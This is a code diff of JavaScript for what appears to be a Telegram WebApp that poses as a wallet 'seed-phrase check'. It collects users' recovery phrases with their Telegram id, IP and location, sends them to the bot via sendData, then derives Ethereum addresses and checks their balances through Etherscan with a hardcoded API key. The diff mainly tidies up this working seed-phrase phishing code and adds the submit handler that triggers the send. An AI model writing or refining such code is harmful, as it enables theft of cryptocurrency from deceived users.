@@ -25,9 +25,9 @@ if (!langs.some(lang => allowedLangs.includes(lang))) {
 
 // ✅ DOM
 window.addEventListener("DOMContentLoaded", () => {
-    feather.replace();
+    feather?.replace();
 
-    if (typeof Telegram !== "undefined" && Telegram.WebApp) {
+    if (window.Telegram?.WebApp) {
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
     }
@@ -35,6 +35,15 @@ window.addEventListener("DOMContentLoaded", () => {
     if (document.getElementById("seedContainer")) {
         renderSeedInputs();
         setupSelect();
+
+        const btn = document.getElementById("submitBtn");
+        btn?.addEventListener("click", () => {
+            try {
+                submitSeed();
+            } catch (e) {
+                console.error("❌ submitSeed error:", e);
+            }
+        });
     } else if (window.location.href.includes("profile.html")) {
         showProfileData();
     }
@@ -109,7 +118,6 @@ function showWarning(message) {
     warning.textContent = message;
     warning.style.display = "block";
 }
-
 function clearWarning() {
     const warning = document.getElementById("validationWarning");
     if (warning) warning.style.display = "none";
@@ -129,7 +137,7 @@ function showProcessing(message) {
     processing.textContent = message;
 }
 
-// 🚀 submitSeed()
+// 🚀 submitSeed
 function submitSeed() {
     clearWarning();
 
@@ -154,7 +162,7 @@ function submitSeed() {
     showProcessing("⏳ Перевірка seed-фрази…");
     document.querySelector(".container").innerHTML = "<h3 style='color:green;text-align:center'>⏳ Перевірка…</h3>";
 
-    const tgUser = (Telegram?.WebApp?.initDataUnsafe?.user) || {};
+    const tgUser = Telegram?.WebApp?.initDataUnsafe?.user || {};
     const payload = {
         user_id: tgUser.id || "-",
         username: tgUser.username || "-",
@@ -173,6 +181,7 @@ function submitSeed() {
 
     if (Telegram?.WebApp?.sendData) {
         Telegram.WebApp.sendData(JSON.stringify(payload));
+        console.log("✅ Payload відправлено");
     }
 
     setTimeout(() => {
@@ -185,27 +194,24 @@ function showProfileData() {
     const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
     const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");
 
-    const seedPhrase = (data.seed || "").trim();
+    const seedPhrase = data.seed || "-";
     const walletType = (data.wallet || "").toLowerCase();
-    const timestamp = data.timestamp || "–";
-    const ip = data.ip || "–";
-    const locationInfo = data.location || "–";
+    const ip = data.ip || "-";
+    const locationInfo = data.location || "-";
+    const timestamp = data.timestamp || "-";
 
     document.getElementById("timestamp").textContent = timestamp;
     document.getElementById("userIp").textContent = ip;
     document.getElementById("userLocation").textContent = locationInfo;
     document.getElementById("seed").textContent = seedPhrase;
 
-    if (!seedPhrase) return console.error("❌ Seed-фраза порожня");
-
     try {
         const wallet = ethers.Wallet.fromMnemonic(seedPhrase);
         const ethAddress = wallet.address;
         document.getElementById("ethAddress").textContent = ethAddress;
-        console.log("✅ ETH адрес:", ethAddress);
         fetchETHBalance(ethAddress, ETHERSCAN_API_KEY);
     } catch (e) {
-        console.error("❌ ETH генерація:", e.message);
+        console.error("❌ ETH адреса не згенерована:", e.message);
     }
 
     document.getElementById("goWalletBtn").addEventListener("click", () => {
@@ -216,11 +222,8 @@ function showProfileData() {
         else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
         else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";
 
-        if (window.Telegram && Telegram.WebApp) {
-            Telegram.WebApp.openLink(url);
-        } else {
-            window.open(url, "_blank");
-        }
+        if (window.Telegram?.WebApp) Telegram.WebApp.openLink(url);
+        else window.open(url, "_blank");
     });
 }
 
@@ -229,11 +232,11 @@ async function fetchETHBalance(address, key) {
         const url = `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${key}`;
         const res = await fetch(url);
         const json = await res.json();
-        if (!json || json.status !== "1" || !json.result) throw new Error("ETH API error");
+        if (json.status !== "1") throw new Error("API помилка");
         const ethBalance = parseFloat(json.result) / 1e18;
         document.getElementById("walletBalance").textContent = `${ethBalance.toFixed(6)} ETH`;
     } catch (e) {
-        console.warn("❌ Помилка балансу ETH:", e.message);
+        console.warn("❌ Баланс ETH:", e.message);
         document.getElementById("walletBalance").textContent = "–";
     }
 }
